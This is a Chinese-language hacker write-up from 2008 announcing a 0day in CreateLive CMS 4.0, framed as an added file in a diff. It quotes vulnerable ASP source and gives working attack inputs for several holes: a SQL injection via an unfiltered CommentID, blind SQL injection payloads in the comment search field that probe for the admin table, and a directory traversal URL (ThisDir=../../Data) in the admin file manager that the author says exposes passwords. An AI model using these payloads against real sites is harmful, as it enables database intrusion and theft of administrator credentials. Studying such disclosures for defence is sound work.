@@ -1,0 +1,92 @@
+CreateLive CMS Version 4.0 0day
+
+
+CreateLive CMS Version 4.0 0day.doc
+by:xiaok q:391232032.771044833 time: 2008-2-4 02:10 xpsp2 ie7 iis5.1 ……
+致敬D.S.T的各位同志，致Hell-Phantom，致on thin ice，致老D，致Doom，致群里那帮有文化的流氓……
+
+漏洞之一
+
+来源kingcms\User\User_Comment.asp CommentID
+sub SaveModify()
+
+……
+CommentID=Trim(Request("CommentID")) '注入
+……
+if CommentID="" then
+FoundErr=True
+ErrMsg=ErrMsg & "<br /><li>请指定评论ID</li>"
+Exit sub
+end if
+……
+if FoundErr=True then exit sub
+sql="Select * from Cl_Comment where ChannelID="&ChannelID&" and UserID="&UserID&" and CommentID=" & CommentID '注入
+Set rsComment=Server.CreateObject("Adodb.RecordSet")
+rsComment.Open sql,Conn,1,3
+if rsComment.Bof or rsComment.EOF then
+FoundErr=True
+ErrMsg=ErrMsg & "<br /><li>找不到指定的评论！</li>"
+else
+……
+
+没有任何过滤……
+当然新问题也来了
+来源 kingcms\User\inc\Cl_ClsSysTem.asp
+'判断提交信息是否来自外部
+Public Function ChkIsOuter()
+Dim server_v1,server_v2
+ChkIsOuter=True
+server_v1=Cstr(Request.ServerVariables("HTTP_REFERER"))
+server_v2=Cstr(Request.ServerVariables("SERVER_NAME"))
+If Mid(server_v1,8,len(server_v2))=server_v2 Then ChkIsOuter=False
+End Function
+
+一切的工具都不能利用，只能去输入一些信息然后post。NB～◎！＃￥￥＃％％
+不过在几秒我又找到一个（因为文章就要写不下去了……）
+
+漏洞之二
+
+大部分网站都要会员审核，不能直接进入。是个搜索漏洞～它的真面目
+http://127.0.0.1/User/User_Comment.asp?ChannelID=1&SearchContent=11&Query=查+询
+
+看看他里面怎么写的
+来源 kingcms\User\User_Comment.asp
+SearchContent = Trim(request("SearchContent"))
+……
+Sub main()
+……
+if SearchContent<>"" then
+strSql2=strSql2 & " and M.CommentContent like '%" & SearchContent & "%' "
+
+构造下
+%'and (select count(*) from admin)>0 and '%'='
+%'and (select count(*) from cl_admin)>0 and '%'='
+
+然后在这里输入
+
+第一句是问他有没有admin这个表它的回答
+
+第二句是问他有没有cl_admin这个表,因为cl_admin存在，所以它的回答是
+
+相信某些人都明白了`只能靠手……
+
+漏洞之三
+
+（要发文章的权限，而且你要把外部提交检测绕过……）也许你等不及了，无聊中准备结束时～
+凌晨2008年2月4日 04:41:07……
+用会员登陆后，然后访问
+/Admin/Admin_Files.asp?action=Main&FileType=select&ChannelID=2&ThisDir=../../Data
+
+你会发现/*因为我用admin登陆的，所以……*/得到密码多么容易
+Admin\Admin_Files.asp
+if ThisDir<>"" then
+ThisDir=Replace(ThisDir & "/","//","/")
+
+手抽筋了，不写了～
+
+漏洞之四
+
+来源与一个防注文件，因为log和admin不在一个数据库，没利用价值……
+ 
+
+
